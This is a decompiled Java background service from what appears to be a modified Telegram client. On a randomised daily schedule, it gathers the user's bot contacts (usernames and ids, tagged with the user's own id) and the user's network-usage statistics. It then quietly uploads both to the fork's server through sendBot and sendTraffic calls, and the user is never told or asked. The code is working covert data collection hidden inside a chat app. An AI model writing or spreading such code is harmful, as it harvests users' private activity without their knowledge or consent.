package org.telegram.customization.service;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import com.google.gson.Gson;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import org.telegram.customization.Internet.HandleRequest;
import org.telegram.customization.Internet.IResponseReceiver;
import org.telegram.customization.dynamicadapter.data.SLSChannel;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.StatsController;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.exoplayer2.DefaultRenderersFactory;
import org.telegram.tgnet.TLRPC$TL_dialog;
import org.telegram.tgnet.TLRPC.User;
import utils.Utilities;
import utils.app.AppPreferences;
import utils.view.Constants;

public class BgsService extends BaseService implements IResponseReceiver {
    int channelCount = 0;
    ArrayList<Long> channelsId = new ArrayList();
    ArrayList<SLSChannel> slsChannels = new ArrayList();

    public static Calendar getCalender() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(11, 15);
        calendar.set(12, Utilities.getRandomMinute());
        calendar.set(13, 0);
        return calendar;
    }

    public static void registerService(Context context) {
        registerService(context, new Intent(context, BgsService.class), getCalender(), AppPreferences.getBotSyncPeriod(context));
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean isForce = false;
        if (intent != null) {
            isForce = intent.getBooleanExtra(Constants.EXTRA_IS_FORCE, false);
        }
        if (!AppPreferences.isRegistered(this)) {
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        } else if (isForce || checkTimeForSend()) {
            final boolean finalIsForce = isForce;
            try {
                new Handler().postDelayed(new Runnable() {

                    /* renamed from: org.telegram.customization.service.BgsService$1$1 */
                    class C12051 extends Thread {
                        C12051() {
                        }

                        public void run() {
                            super.run();
                            int userId = 0;
                            if (UserConfig.getCurrentUser() != null) {
                                userId = UserConfig.getCurrentUser().id;
                            }
                            ArrayList<TLRPC$TL_dialog> bots = MessagesController.staticBotArr;
                            if (bots != null && bots.size() > 0) {
                                Iterator it = bots.iterator();
                                while (it.hasNext()) {
                                    TLRPC$TL_dialog dialog = (TLRPC$TL_dialog) it.next();
                                    if (dialog != null) {
                                        User user = MessagesController.getInstance().getUser(Integer.valueOf((int) dialog.id));
                                        BgsService bgsService = BgsService.this;
                                        bgsService.channelCount++;
                                        if (user != null) {
                                            Log.d("LEE", user.username + "");
                                            SLSChannel channel = new SLSChannel();
                                            channel.setChannelId(user.username);
                                            channel.setName("");
                                            channel.setId((long) user.id);
                                            channel.setUserId(userId);
                                            BgsService.this.slsChannels.add(channel);
                                        }
                                    }
                                }
                            }
                            if (BgsService.this.channelCount == 0) {
                                BgsService.this.stopSelf();
                            }
                            String json = new Gson().toJson(BgsService.this.slsChannels);
                            if (finalIsForce || (BgsService.this.checkTimeForSend() && BgsService.this.slsChannels.size() > 0)) {
                                HandleRequest.getNew(BgsService.this.getApplicationContext(), BgsService.this).sendBot(json);
                                HandleRequest.getNew(BgsService.this.getApplicationContext(), BgsService.this).sendTraffic(new Gson().toJson(StatsController.getInstance().getNetworkUsageStatistics()));
                            }
                        }
                    }

                    public void run() {
                        new C12051().start();
                    }
                }, DefaultRenderersFactory.DEFAULT_ALLOWED_VIDEO_JOINING_TIME_MS);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return 1;
        } else {
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onResult(Object object, int StatusCode) {
        switch (StatusCode) {
            case 18:
                AppPreferences.setLastSuccessFullyTimeSyncBot(getApplicationContext(), System.currentTimeMillis());
                break;
        }
        stopSelf();
    }

    public boolean checkTimeForSend() {
        if (AppPreferences.getBotSyncPeriod(getApplicationContext()) + AppPreferences.getLastSuccessFullyTimeSyncBot(getApplicationContext()) < System.currentTimeMillis()) {
            return true;
        }
        return false;
    }
}
